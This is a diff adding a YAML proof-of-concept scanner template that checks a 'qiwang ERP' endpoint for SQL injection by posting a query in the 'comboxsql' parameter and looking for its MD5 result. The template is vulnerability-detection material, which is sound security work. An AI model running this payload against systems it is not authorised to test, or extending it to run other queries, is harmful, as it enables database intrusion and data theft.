@@ -1,0 +1,23 @@
+name: poc-yaml-qiwang-erp-sql-injection
+manual: false
+transport: http
+set:
+    s1: randomInt(3, 7)
+    s2: randomLowercase(s1)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /mainFunctions/comboxstore.action
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: comboxsql=select HashBytes('MD5', '{{s2}}')
+            follow_redirects: false
+        expression: response.status == 200 && response.body.ibcontains(bytes(md5(s2)))
+expression: r0()
+detail:
+    author: kzaopa(https://github.com/kzaopa)
+    vulnerability:
+        id: CT-479107
+        level: high
